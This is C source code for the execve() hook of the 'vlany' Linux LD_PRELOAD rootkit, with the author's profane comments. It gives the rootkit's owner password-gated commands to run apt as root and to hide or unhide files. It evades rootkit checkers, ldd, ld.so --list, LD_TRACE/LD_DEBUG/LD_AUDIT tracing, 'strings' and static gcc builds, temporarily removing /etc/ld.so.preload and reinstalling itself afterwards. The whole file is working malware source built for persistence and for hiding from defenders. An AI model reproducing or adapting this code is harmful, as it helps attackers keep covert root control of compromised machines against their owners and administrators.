// a lotta shit happens in here. I really should clean all of this up
// brace for plethora of commentary. it's to help me. not you. (ok maybe you sometimes)
// I could probably tidy up this entire file, but I implemented it in an earlier version of vlany, and utlimately, I'm lazy

// in terms of functionality however, the tidiness (or lack thereof) doesn't detriment the execve hook.
// I'll also be tidying up bits here and there, so the final form (lol nice joke loser)
// probably will look somewhat clean anyway

// if you want to add your own commands in here, just try to follow the same structure as the default commands

int execve(const char *filename, char *const argv[], char *const envp[])
{
    #ifdef DEBUG
        printf("[vlany] execve() called\n");
    #endif

    HOOK(old_execve, CEXECVE);
    HOOK(old_unlink, CUNLINK);

    int i, pid, ret;

    // entire owned() check allows user of the owner shell to use the vlany execve functions
    if(owned())
    {
        if(argv[1] != NULL)
        {
            char *execve_pw = strdup(EXECVE_PW); xor(execve_pw);

            // if the first argument of argv is the user's execve password, the user using the owner shell
            // is in fact the fully authorized owner of the rootkit. allow them access to the execve commands :)
            if(!strcmp(argv[1], execve_pw))
            {
                // the three functions relative to file hiding
                HOOK(old_setxattr, CSETXATTR);
                HOOK(old_removexattr, CREMOVEXATTR);

                char *apt = strdup(APT); xor(apt);
                if(strstr(filename, apt))
                {
                    CLEAN(apt);
                    char *apt_update = strdup(APT_UPDATE); xor(apt_update);
                    char *apt_install = strdup(APT_INSTALL); xor(apt_install);
                    char *apt_remove = strdup(APT_REMOVE); xor(apt_remove);

                    if(argv[2] == NULL || // no argument given at all after the password?
                      (strcmp(argv[2], apt_update) && strcmp(argv[2], apt_install) && strcmp(argv[2], apt_remove)) || // none of the predetermined arguments?
                      (strcmp(argv[2], apt_update) && argv[3] == NULL)) // install/remove argument but no 'package' argument given?
                    {
                        char *apt_usage = strdup(APT_USAGE); xor(apt_usage);
                        printf("%s", apt_usage);

                        CLEAN(apt_update);
                        CLEAN(apt_install);
                        CLEAN(apt_remove);
                        CLEAN(apt_usage);
                        exit(0);
                    }

                    printf("running ./apt with option %s\n", argv[2]);

                    // warnings, etc
                    // thinking about making a macro to xor strings, print them and clean up
                    // 23/10/2016 done lol^^
                    char c = 0, *apt_warning = strdup(APT_WARNING); xor(apt_warning);
                    printf("%s", apt_warning);
                    CLEAN(apt_warning);
                    while(c != '\n') c = getchar(); // we're on linux.. so we only need to check for \n, no \r

                    char old_cwd[666]; // 666 hahahaha hail satan
                    getcwd(old_cwd, sizeof(old_cwd)); // there's not really any point in checking if this will return NULL
                    chdir("/"); // if the user's in a hidden directory, not much will work, let's just temporarily cd /

                    HOOK(old_setgid, CSETGID);
                    char *apt_gid_set = strdup(APT_GID_SET); xor(apt_gid_set);
                    printf("%s", apt_gid_set);
                    CLEAN(apt_gid_set);
                    old_setgid(0); // PROCESS IS NOW UNHIDDEN

                    // yeah, i used system()
                    // so what bitch
                    if(!strcmp(argv[2], apt_update))
                    {
                        char *apt_update_cmd = strdup(APT_UPDATE_CMD); xor(apt_update_cmd);
                        int sret = system(apt_update_cmd);
                        CLEAN(apt_update_cmd);
                        printf("return value of system() for apt_update condition: %d\n", sret);
                    }else if(!strcmp(argv[2], apt_install))
                    {
                        char apt_install_c[64], *apt_install_cmd = strdup(APT_INSTALL_CMD); xor(apt_install_cmd);
                        snprintf(apt_install_c, sizeof(apt_install_c), apt_install_cmd, argv[3]);
                        CLEAN(apt_install_cmd);
                        int sret = system(apt_install_c);
                        printf("return value of system() for apt_install condition: %d\n", sret);
                    }else if(!strcmp(argv[2], apt_remove))
                    {
                        char apt_rm_c[64], *apt_remove_cmd = strdup(APT_REMOVE_CMD); xor(apt_remove_cmd);
                        snprintf(apt_rm_c, sizeof(apt_rm_c), apt_remove_cmd, argv[3]);
                        CLEAN(apt_remove_cmd);
                        int sret = system(apt_rm_c);
                        printf("return value of system() for apt_remove condition: %d\n", sret);
                    }

                    old_setgid(MAGIC_GID); // reset the magic GID so we can hide again :3
                    char *apt_success = strdup(APT_SUCCESS); xor(apt_success);
                    printf("%s", apt_success);
                    CLEAN(apt_success);
                    chdir(old_cwd);
                    CLEAN(apt_update);
                    CLEAN(apt_install);
                    CLEAN(apt_remove);
                    exit(0);
                }
                CLEAN(apt);

                char *unhide_file = strdup(UNHIDE_FILE); xor(unhide_file);
                if(strstr(filename, unhide_file))
                {
                    CLEAN(unhide_file);
                    if(argv[2] == NULL)
                    {
                        char *unhide_usage = strdup(UNHIDE_USAGE); xor(unhide_usage);
                        printf("%s", unhide_usage);
                        CLEAN(unhide_usage); exit(0);
                    }

                    char *target_file = argv[2];

                    char *install = strdup(INSTALL); xor(install);
                    char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
                    if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file))
                    {
                        printf("Try to unhide that again and I'll fucking kill you.\n");
                        CLEAN(ld_preload_etc); CLEAN(install);
                        exit(0);
                    }
                    CLEAN(ld_preload_etc); CLEAN(install);

                    char xattr_user[256];
                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
                    char *xattr = strdup(XATTR);

                    xor(hidden_xattr_1_str); xor(xattr);
                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str); // create user.blahblahblah attribute to hide the file
                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);

                    int ret = old_removexattr(target_file, xattr_user);

                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
                    if(ret < 0 && errno == ENODATA) { printf("File %s isn't hidden.\n", target_file); exit(0); } // visible file

                    char *unhide_success = strdup(UNHIDE_SUCCESS); xor(unhide_success);
                    printf(unhide_success, target_file);
                    CLEAN(unhide_success);
                    exit(0);
                }
                CLEAN(unhide_file);

                char *hide_file = strdup(HIDE_FILE); xor(hide_file);
                if(strstr(filename, hide_file))
                {
                    CLEAN(hide_file);
                    if(argv[2] == NULL)
                    {
                        char *hide_usage = strdup(HIDE_USAGE); xor(hide_usage);
                        printf("%s", hide_usage);
                        CLEAN(hide_usage); exit(0);
                    }

                    char *target_file = argv[2], xattr_user[256];
                    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
                    char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
                    char *xattr = strdup(XATTR);

                    xor(hidden_xattr_1_str);
                    xor(xattr);
                    snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
                    CLEAN(xattr);
                    CLEAN(hidden_xattr_1_str);

                    xor(hidden_xattr_2_str);
                    int ret = old_setxattr(target_file, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
                    CLEAN(hidden_xattr_2_str);

                    if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
                    if(ret < 0 && errno == EEXIST) { printf("File %s is already hidden.\n", target_file); exit(0); } // file already hidden

                    char *hide_success = strdup(HIDE_SUCCESS); xor(hide_success);
                    printf(hide_success, target_file);
                    CLEAN(hide_success);
                    exit(0);
                }
                CLEAN(hide_file);

                char *help = strdup(HELP); xor(help);
                if(strstr(filename, help))
                {
                    CLEAN(help);
                    char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
                    printf("%s\n", shell_msg);
                    CLEAN(shell_msg); exit(0);
                }
                CLEAN(help);

            }

            CLEAN(execve_pw);
        }

        // if the user of the owner shell is just executing a regular command/binary, just continue as normal
        return old_execve(filename, argv, envp);
    }

    if(hidden_xattr(filename)) { errno = ENOENT; return -1; }

    // we need to hide from rootkit detection tools. in order to do this, we'll remove ourself during the checks, and then
    // when all of the rootkit checks are finished, we'll reinstall ourselves. simple. :)

    // moved the evasions into one function called hide_vlany. this saves me a lot of time.
    // previously, checking for each GAY PROCESS was done in seperate blocks of code. now the names of the GAY PROCESSES
    // are stored in an array and looped through below. :)
    // see config.py (GAY_PROCS) to add your own processes/binaries/environment variables to hide from

    for(i = 0; i < GPSIZE; i++)
    {
        char *gpstr = strdup(gay_procs_list[i]); xor(gpstr);
        int check_curr_proc = hide_vlany(filename, gpstr, ret);
        CLEAN(gpstr);

        if(check_curr_proc == 1) exit(0);
        else if(check_curr_proc == 0) { errno = EIO; return -1; }
        else if(check_curr_proc == -1) return -1;
        else if(check_curr_proc == 2) return old_execve(filename, argv, envp);
    }

    char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
    char *ld_so_path = strdup(LD_SO_PATH); xor(ld_so_path);

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
    
    if(!fnmatch(ld_linux_so_path, filename, FNM_PATHNAME) || !fnmatch(ld_so_path, filename, FNM_PATHNAME))
    {
        for(i = 0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "--list")) // there's no point in hiding this string.. it's so ambiguous it doesn't even matter lol
            {
                CLEAN(ld_so_path); CLEAN(ld_linux_so_path);

                if(getuid() != 0 && geteuid() != 0)
                {
                    CLEAN(ld_preload);
                    errno = EIO; return -1;
                }

                old_unlink(ld_preload);
                CLEAN(ld_preload);

                if((pid = fork()) == -1) return -1;
                else if(pid == 0) return old_execve(filename, argv, envp);

                wait(&ret); reinstall();
                exit(0);
            }
        }
    }
    CLEAN(ld_so_path);
    CLEAN(ld_linux_so_path);

    // you trying to find me? FUCK YOU LDD
    for(i = 0; envp[i] != NULL; i++)
    {
        char *ld_trace_env_var = strdup(LD_TRACE_ENV_VAR); xor(ld_trace_env_var);
        char *ld_debug_env_var = strdup(LD_DEBUG_ENV_VAR); xor(ld_debug_env_var);
        char *ld_audit_env_var = strdup(LD_AUDIT_ENV_VAR); xor(ld_audit_env_var);
        char *ld_audit_getenv = strdup(LD_AUDIT_GETENV); xor(ld_audit_getenv);
        if(strstr(envp[i], ld_trace_env_var) || strstr(envp[i], ld_debug_env_var) || strstr(envp[i], ld_audit_env_var) || getenv(ld_audit_getenv))
        {
            CLEAN(ld_trace_env_var);
            CLEAN(ld_debug_env_var);
            CLEAN(ld_audit_env_var);
            CLEAN(ld_audit_getenv);

            if(getuid() != 0 && geteuid() != 0)
            {
                CLEAN(ld_preload);
                errno = EIO; return -1;
            }

            old_unlink(ld_preload);
            CLEAN(ld_preload);

            if((pid = fork()) == -1) return -1;
            else if(pid == 0) return old_execve(filename, argv, envp);

            wait(&ret); reinstall();
            exit(0);
        }
        CLEAN(ld_trace_env_var);
        CLEAN(ld_debug_env_var);
        CLEAN(ld_audit_env_var);
        CLEAN(ld_audit_getenv);
    }

    char *libc_path = strdup(LIBC_PATH); xor(libc_path);
    char *ld_preload_env = strdup(LD_PRELOAD_ENV); xor(ld_preload_env);
    for(i = 0; envp[i] != NULL; i++)
    {
        if(getenv(ld_preload_env) && strstr(envp[i], libc_path)) // don't look at me!! i'm naked!!
        {
            CLEAN(ld_preload_env); CLEAN(libc_path);
            errno = EPERM; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
            return -1;
        }
    }
    CLEAN(ld_preload_env);
    CLEAN(libc_path);

    if(argv[0] != NULL && strstr(argv[0], "strings"))
    {
        char *lib_name = strdup(LIB_NAME); xor(lib_name);
        for(i = 0; argv[i] != NULL; i++)
        {
            if(strstr(argv[i], lib_name)) // strstr and not strcmp because it could be a full path
            {
                CLEAN(lib_name);
                errno = EIO;
                return -1;
            }
        }
        CLEAN(lib_name);
    }

    // no point in hiding these strings, it's not really sensitive data
    if(argv[0] != NULL && strstr(argv[0], "gcc"))
    {
        for(i = 0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "-static")) // trying to statically compile a binary.. eww
            {
                // This works and removes the -static flag from the gcc execution but for some reason gcc throws a "not found error" with an empty string
                // printf("gcc -static flag detected. overwriting -static flag\n");
                // strncpy(argv[i], "", strlen(argv[i]));
                // printf("-static flag overwritten\n");
                // For now, let's just return a kernel memory error
                // Sigh...

                errno = ENOMEM;
                return -1;
            }
        }
    }

    if(geteuid() == 0) reinstall();

    return old_execve(filename, argv, envp);
}
